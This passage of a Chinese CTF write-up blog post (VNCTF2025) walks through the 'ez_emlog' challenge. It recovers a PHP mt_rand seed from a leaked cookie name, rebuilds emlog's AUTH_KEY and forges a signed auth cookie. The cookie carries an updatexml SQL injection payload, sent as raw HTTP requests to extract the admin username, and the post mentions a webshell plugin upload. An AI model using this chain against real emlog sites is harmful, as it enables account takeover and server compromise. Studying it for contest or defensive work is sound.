class="string">&#x27;m&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;iijji&quot;</span>: <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;ijjij&quot;</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jiiji&quot;</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;ijijj&quot;</span>: <span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jijii&quot;</span>: <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;iiiii&quot;</span>: <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jjiij&quot;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;ijjji&quot;</span>: <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jiiij&quot;</span>: <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;iiiij&quot;</span>: <span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;iijij&quot;</span>: <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jjiji&quot;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jijjj&quot;</span>: <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;iijjl&quot;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;iiilj&quot;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;iliii&quot;</span>: <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jiili&quot;</span>: <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jilji&quot;</span>: <span class="string">&#x27;5&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;iliji&quot;</span>: <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jjjlj&quot;</span>: <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;ijljj&quot;</span>: <span class="string">&#x27;8&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;iljji&quot;</span>: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">           <span class="string">&quot;jjjli&quot;</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_string</span>(<span class="params">s, ij_dict</span>):</span><br><span class="line">    c = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">5</span>):</span><br><span class="line">        c += ij_dict[s[i:i + <span class="number">5</span>]]</span><br><span class="line">    <span class="comment"># print(c)</span></span><br><span class="line"></span><br><span class="line">    c = <span class="built_in">list</span>(c.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">if</span> c[i] &gt; <span class="number">55</span>:</span><br><span class="line">            c[i] -= (i % <span class="number">10</span> + <span class="number">55</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            c[i] += (<span class="number">49</span> - i % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c), <span class="number">2</span>):</span><br><span class="line">        c[i], c[i + <span class="number">1</span>] = c[i + <span class="number">1</span>], c[i]</span><br><span class="line">    d = <span class="built_in">bytes</span>.fromhex(<span class="built_in">bytes</span>(c).decode())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(d)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(d[i] - <span class="number">68</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    process_string(s, ij_dict)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="remake"><a href="#remake" class="headerlink" title="remake"></a>remake</h1><h2 id="ez-emlog"><a href="#ez-emlog" class="headerlink" title="ez_emlog"></a><strong>ez_emlog</strong></h2><p>看到猴子大王搭建博客的时间是最近，直接写个最新版本的代码来进行审计，且在网上进行信息搜集，发现网上特别多文件上传getshell，但是要进行文件上传就必须进入后台，所以我们可以搜索emlog越权，找到部分文章</p>
<p><a target="_blank" rel="noopener" href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Emlog/Emlog%20%E8%B6%8A%E6%9D%83%26%E5%90%8E%E5%8F%B0getshell/">文章1</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36759934/article/details/127821085">文章2</a></p>
<p>看完之后就是<code>install.php</code>的洞，接着没看多久，题目就给提示了，</p>
<blockquote>
<p>install.php</p>
<p>mt_rand的安全问题</p>
</blockquote>
<p>也就是和文章中的类似，我们只需要找到关键代码即可，但是此刻我还没做完奶龙，于是便调整战斗方向，现在来浮现一下</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250211-104414.jpg" alt="1"></p>
<p>看到了php版本，而伪随机数的问题又是只有两个版本，所以这里锁定结果为php7</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250211-104344.jpg" alt="1"></p>
<p>看到了两个key的生成逻辑，到这里<code>install.php</code>就没啥用了，跟进<code>getRandStr()</code>，进行运行生成随机数发现是伪随机数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span>, <span class="variable">$special_chars</span> = <span class="literal">true</span>, <span class="variable">$numeric_only</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numeric_only</span>) &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$special_chars</span>) &#123;</span><br><span class="line">            <span class="variable">$chars</span> .= <span class="string">&#x27;!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$randStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$chars_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randStr</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$chars</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="variable">$chars_length</span> - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randStr</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>);</span><br></pre></td></tr></table></figure>

<p>找不到东西了，全局搜索<code>AUTH_KEY</code>，来到<code>loginauth.php</code>，这里就是鉴权逻辑了，其中拿出关键部分</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250211-105348.jpg" alt="1"></p>
<p>直接对sql语句进行拼接，可以进行sql注入，回头看这个函数啥时候调用的，就在他上面，</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250211-105512.jpg" alt="1"></p>
<p>还有就是cookie的处理</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateAuthCookie</span>(<span class="params"><span class="variable">$cookie</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$cookie</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$cookie_elements</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$cookie</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$cookie_elements</span>) !== <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$expiration</span>, <span class="variable">$hmac</span>) = <span class="variable">$cookie_elements</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$expiration</span>) &amp;&amp; <span class="variable">$expiration</span> &lt; <span class="title function_ invoke__">time</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">emHash</span>(<span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line">        <span class="variable">$hash</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>, <span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$hmac</span> !== <span class="variable">$hash</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$user</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserDataByLogin</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$user</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当然我们的目的也别忘了，寻找<code>AUTH_KEY</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">emHash</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, AUTH_KEY);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>写个代码运行一下，发现是根据<code>AUTH_KEY</code>产生的不变值，是可控的，暂时找不到东西了，回头再去看发现原来<code>AUTH_COOKIE_NAME</code>也是利用的<code>getRandStr</code>产生的随机数，会全局搜索到<code>setAuthCookie</code>，看看哪里调用了这个函数，跟进到<code>account.php</code>，在最后看到了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&#x27;logout&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(AUTH_COOKIE_NAME, <span class="string">&#x27; &#x27;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">31536000</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">emDirect</span>(<span class="string">&quot;../&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这不是就能获得其中一个随机数了，然后爆破种子了吗 <a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">php_mt_seed</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">./php_mt_seed 1165510977</span><br></pre></td></tr></table></figure>

<p>如果成功了就是安装好了，那我们开始爆破，首先获得随机数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node.vnteam.cn:47975/admin/account.php?action=logout&quot;</span></span><br><span class="line">r = requests.get(url, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line"><span class="built_in">print</span>(r.headers.get(<span class="string">&quot;Set-Cookie&quot;</span>))</span><br><span class="line"><span class="comment"># EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=%20; expires=Mon, 12 Feb 2024 03:21:20 GMT; Max-Age=0; path=/</span></span><br></pre></td></tr></table></figure>

<p>参考我以前的文章将字符串进行分解 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dict1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">dict2 = <span class="string">&#x27;RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=&#x27;</span></span><br><span class="line">response = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dict2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dict1)):</span><br><span class="line">        <span class="keyword">if</span> dict2[i] == dict1[j]:</span><br><span class="line">            response += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(dict1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line"><span class="comment"># 43 43 0 61 1 1 0 61 26 26 0 61 48 48 0 61 21 21 0 61 39 39 0 61 35 35 0 61 51 51 0 61 57 57 0 61 50 50 0 61 38 38 0 61 4 4 0 61 51 51 0 61 37 37 0 61 32 32 0 61 38 38 0 61 17 17 0 61 57 57 0 61 58 58 0 61 11 11 0 61 5 5 0 61 9 9 0 61 47 47 0 61 0 0 0 61 11 11 0 61 40 40 0 61 55 55 0 61 24 24 0 61 16 16 0 61 50 50 0 61 11 11 0 61 17 17 0 61 </span></span><br></pre></td></tr></table></figure>

<p>由于前面我们知道还拼接了<code>getRandStr(32)</code>，所以我们还要补32组0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./php_mt_seed 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 43 43 0 61 1 1 0 61 26 26 0 61 48 48 0 61 21 21 0 61 39 39 0 61 35 35 0 61 51 51 0 61 57 57 0 61 50 50 0 61 38 38 0 61 4 4 0 61 51 51 0 61 37 37 0 61 32 32 0 61 38 38 0 61 17 17 0 61 57 57 0 61 58 58 0 61 11 11 0 61 5 5 0 61 9 9 0 61 47 47 0 61 0 0 0 61 11 11 0 61 40 40 0 61 55 55 0 61 24 24 0 61 16 16 0 61 50 50 0 61 11 11 0 61 17 17 0 61 </span><br></pre></td></tr></table></figure>

<p>得到种子之后就可以拿了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span>, <span class="variable">$special_chars</span> = <span class="literal">true</span>, <span class="variable">$numeric_only</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numeric_only</span>) &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$special_chars</span>) &#123;</span><br><span class="line">            <span class="variable">$chars</span> .= <span class="string">&#x27;!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$randStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$chars_length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randStr</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$chars</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="variable">$chars_length</span> - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randStr</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$seed</span> = <span class="number">2430606281</span>;</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>);</span><br><span class="line"><span class="comment">// yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;const AUTH_KEY = &#x27;&quot;</span> . <span class="title function_ invoke__">getRandStr</span>(<span class="number">32</span>) . <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">getUA</span>()) . <span class="string">&quot;&#x27;;&quot;</span></span><br></pre></td></tr></table></figure>

<p>UA头在文章里面，文章给的数据包还有有道理的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$UA=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&quot;</span></span><br><span class="line"><span class="comment">//const AUTH_KEY = &#x27;&quot; . yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA . md5($UA) . &quot;&#x27;;</span></span><br><span class="line"><span class="comment">//echo AUTH_KEY;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$UA</span> = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&quot;</span>;</span><br><span class="line"><span class="variable">$auth_key</span> = <span class="string">&#x27;yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$UA</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$auth_key</span>;</span><br><span class="line"><span class="comment">// yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA558fb80a37ff0f45d5abbc907683fc02</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">emHash</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA558fb80a37ff0f45d5abbc907683fc02&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>, <span class="variable">$data</span>, <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$expiration</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="string">&quot;&#x27; and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1)#&quot;</span>;</span><br><span class="line"><span class="variable">$auth_key</span> = <span class="title function_ invoke__">emHash</span>(<span class="variable">$username</span> . <span class="string">&#x27;|&#x27;</span> . <span class="variable">$expiration</span>);</span><br><span class="line"><span class="variable">$hash</span>=<span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;md5&#x27;</span>,<span class="variable">$username</span>.<span class="string">&#x27;|&#x27;</span>.<span class="variable">$expiration</span>,<span class="variable">$auth_key</span>);</span><br><span class="line"><span class="variable">$cookie</span>=<span class="variable">$username</span>.<span class="string">&#x27;|&#x27;</span>.<span class="variable">$expiration</span>.<span class="string">&#x27;|&#x27;</span>.<span class="variable">$hash</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cookie</span>;</span><br><span class="line"><span class="comment">// &#x27; and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1)#|0|36d259d7087ad3871811f309eebb0ddf</span></span><br></pre></td></tr></table></figure>

<p>python发包发不了了一直是502，只能发数据包</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node.vnteam.cn:46959</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=&#x27; and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1)#|0|36d259d7087ad3871811f309eebb0ddf</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意格式别错了</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node.vnteam.cn:46959</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=&#x27; and updatexml(1,concat(0x7e,(select(substr(username,17,32))from(emlog_user)),0x7e),1)#|0|d14367cc322f7d8818b7b6284c7c64ae</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到用户名<code>1QXgVCpRbGseY_UA6DPDV1K8XOCZHUxm</code></p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250211-123657.jpg" alt="1"></p>
<p>我们可以直接上传插件，压缩包里面放webshell即可，看了刚才的那两个文章的也知道压缩包怎么制作了，就不写了</p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250211-124927.jpg" alt="1"></p>
<p>得到文件路径，并且跟进<code>emUnZip</code></p>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250211-125246.jpg" alt="1"></p>
<blockquote>
<p>综上这里就是检测压缩包中文件夹里面是否存在一个与文件夹名称一致的PHP文件，最后再解压</p>
</blockquote>
<p><img src="/../images/achieve/2025/2/VNCTF2025/QQ20250211-125332.jpg" alt="1"></p>
<p>本来还想要浮现aimind，但是环境好像关了</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechat.png" alt="baozongwi reward">
        <span>reward</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>baozongwi
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://baozongwi.xyz/posts/2b933189.html" title="VNCTF2025">https://baozongwi.xyz/posts/2b933189.html</a>
  </li>
  <li class="post-copyright-license">
      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/sqlite/" rel="tag"># sqlite</a>
              <a href="/tags/ssti/" rel="tag"># ssti</a>
              <a href="/tags/go/" rel="tag"># go</a>
              <a href="/tags/Fastjson/" rel="tag"># Fastjson</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/d66f78b0.html" rel="prev" title="hgame2025">
                  <i class="fa fa-angle-left"></i> hgame2025
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/1cbad7d9.html" rel="next" title="N1Junior2025">
                  N1Junior2025 <i class="fa fa-angle-right"></i>
                </a>
            </div>
